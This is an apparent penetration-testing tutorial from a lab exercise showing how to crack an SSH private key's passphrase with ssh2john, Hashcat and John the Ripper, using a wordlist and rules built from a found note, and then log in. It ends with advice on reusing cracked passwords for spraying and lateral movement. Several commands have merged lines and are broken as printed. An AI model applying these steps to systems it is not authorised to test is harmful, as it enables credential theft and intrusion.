# Cracking SSH Private Key Passphrases

## Overview

SSH private keys are often protected with a passphrase. If a private key is discovered during a penetration test, it may not be directly usable until the passphrase is recovered.

A common attack path is:

1. Discover or download an SSH private key.
2. Attempt to use the key.
3. Confirm that a passphrase is required.
4. Convert the private key into a crackable hash format.
5. Build a targeted wordlist and rule set.
6. Crack the passphrase using Hashcat or John the Ripper.
7. Use the recovered passphrase to authenticate with SSH.

---

## Example Scenario

During enumeration, a web-based file manager exposes two useful files:

```text
id_rsa
note.txt
```

The `id_rsa` file is an SSH private key.

The `note.txt` file contains possible password material:

```
Dave's password list:Windowrickc137davesuperdavemegadaveumbrellaNote to myself:New password policy starting in January 2022.Passwords need 3 numbers, a capital letter and a special character
```

This gives two useful pieces of information:

|Finding|Use|
|---|---|
|Existing password words|Build a custom wordlist|
|Password policy|Build targeted cracking rules|
|Reused number pattern: `137`|Append likely digits|
|Capitalised word: `Window`|Try capitalising base words|
|No visible special character|Try common special characters|

---

## Step 1 — Download the SSH Key and Notes

Save the discovered files locally.

Example working directory:

```
mkdir -p ~/passwordattackscd ~/passwordattacks
```

Files:

```
id_rsanote.txt
```

Review the note:

```
cat note.txt
```

---

## Step 2 — Fix SSH Private Key Permissions

SSH will refuse to use private keys with overly permissive permissions.

Set the key to owner-read/write only:

```
chmod 600 id_rsa
```

---

## Step 3 — Attempt SSH Login with the Key

Try authenticating with the private key.

```
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

Example behaviour:

```
Enter passphrase for key 'id_rsa':Enter passphrase for key 'id_rsa':Enter passphrase for key 'id_rsa':dave@192.168.50.201's password:
```

If SSH asks for a passphrase, the key is encrypted.

At this point, try obvious candidate passwords from discovered notes. If none work, move to cracking.

---

## Step 4 — Convert the SSH Private Key to a Hash

Use `ssh2john` from the John the Ripper suite to convert the private key into a crackable hash.

```
ssh2john id_rsa > ssh.hash
```

Review the generated hash:

```
cat ssh.hash
```

Example format:

```
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7...
```

The filename before the first colon can be removed if required by the cracking tool.

Example:

```
cut -d ':' -f2- ssh.hash > ssh_clean.hash
```

---

## Step 5 — Identify the Hashcat Mode

Search Hashcat for SSH private key modes:

```
hashcat -h | grep -i "ssh"
```

Example output:

```
22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)     | Private Key
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)     | Private Key
22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$) | Private Key
22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)     | Private Key
22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)     | Private Key
```

If the converted hash contains:

```
$sshng$6$
```

Use Hashcat mode:

```
22921
```

---

## Step 6 — Build a Custom Wordlist

Create a wordlist from discovered password material.

```
Window
rickc137
dave
superdave
megadave
umbrella
```

Check it:

```
cat ssh.passwords
```

---

## Step 7 — Build a Hashcat Rule File

The note says passwords require:

- 3 numbers
- a capital letter
- a special character

Observed patterns:

|Pattern|Example|
|---|---|
|Three digits|`137` from `rickc137`|
|Capitalisation|`Window`|
|Likely special characters|`!`, `@`, `#`|

Create a rule file:

```
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Rule explanation:

|Rule Element|Meaning|
|---|---|
|`c`|Capitalise the first character|
|`$1`|Append `1`|
|`$3`|Append `3`|
|`$7`|Append `7`|
|`$!`|Append `!`|
|`$@`|Append `@`|
|`$#`|Append `#`|

Example mutation:

```
umbrella → Umbrella137!
```

---

## Step 8 — Attempt Cracking with Hashcat

Run Hashcat using the detected SSH private key mode.

```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

Possible error:

```
Token length exception
No hashes loaded
```

This may occur with some modern OpenSSH private keys, especially where the key uses a cipher or format unsupported by the selected Hashcat mode.

If Hashcat fails, try John the Ripper instead.

---

## Step 9 — Convert the Rule File for John the Ripper

John rules need a named rule section.

Edit or recreate `ssh.rule`

Append the rules to John’s config file:

```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

Alternative path check:

```
locate john.conf
```

Common locations:

```
/etc/john/john.conf/usr/share/john/john.conf
```

---

## Step 10 — Crack the SSH Passphrase with John

Run John with the custom wordlist and rule set:

```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

Example successful output:

```
Umbrella137!     (?)1g 0:00:00:00 DONESession completed.
```

Display cracked results reliably:

```
john --show ssh.hash
```

---

## Step 11 — Use the Cracked Passphrase

Use the private key again:

```
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

When prompted:

```
Enter passphrase for key 'id_rsa':
```

Enter the cracked passphrase:

```
Umbrella137!
```

Successful login example:

```
Welcome to Alpine!0d6d28cfbd9c:~$
```

---

## Quick Command Reference

### Prepare Key

```
chmod 600 id_rsa
```

### Test SSH Login

```
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

### Convert SSH Key to John Hash

```
ssh2john id_rsa > ssh.hash
```

### Find Hashcat SSH Modes

```
hashcat -h | grep -i "ssh"
```

### Create Wordlist

```
cat > ssh.passwords << 'EOF'Windowrickc137davesuperdavemegadaveumbrellaEOF
```

### Create Hashcat Rule

```
cat > ssh.rule << 'EOF'c $1 $3 $7 $!c $1 $3 $7 $@c $1 $3 $7 $#EOF
```

### Crack with Hashcat

```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

### Create John Rule

```
cat > ssh.rule << 'EOF'[List.Rules:sshRules]c $1 $3 $7 $!c $1 $3 $7 $@c $1 $3 $7 $#EOF
```

### Add Rule to John Config

```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

### Crack with John

```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

### Show Cracked Passphrase

```
john --show ssh.hash
```

---

## Troubleshooting

### SSH Refuses the Private Key

Error may occur if permissions are too open.

Fix:

```
chmod 600 id_rsa
```

---

### Hashcat Shows `Token length exception`

Example:

```
Token length exceptionNo hashes loaded
```

Possible cause:

- Unsupported OpenSSH private key format
- Unsupported cipher, such as `aes-256-ctr`
- Hashcat mode mismatch

Try John the Ripper instead:

```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

---

### John Rules Not Found

If John cannot find the custom rule, check that it was added to the correct config file.

Find John config:

```
locate john.conf
```

Check for the rule:

```
grep -A 5 "sshRules" /etc/john/john.conf
```

---

## Methodology Notes

When cracking passphrases, avoid relying only on generic wordlists. Human behaviour patterns are often more valuable.

Useful indicators include:

|Indicator|Example|
|---|---|
|Usernames|`dave`|
|Notes or reminders|`note.txt`|
|Previous passwords|`rickc137`|
|Password policy|3 numbers, capital letter, special character|
|Reused patterns|`137`|
|Capitalisation habits|`Window`|
|Common suffixes|`!`, `@`, `#`|

A strong targeted rule can be more effective than a huge untargeted wordlist.

---

## Key Takeaways

- SSH private keys may still require a passphrase.
- `ssh2john` converts SSH private keys into a crackable hash format.
- Hashcat supports several SSH key modes, but may fail on some modern OpenSSH key formats.
- John the Ripper can often handle SSH private key hashes that Hashcat struggles with.
- Notes, password policies, and reused user patterns are valuable for building custom rules.
- Always keep discovered passwords for future attacks such as password spraying, lateral movement, or credential reuse checks.

---

## Tags

#pentesting #password-attacks #ssh #john-the-ripper #hashcat #ssh2john #private-keys #credential-attacks #oscp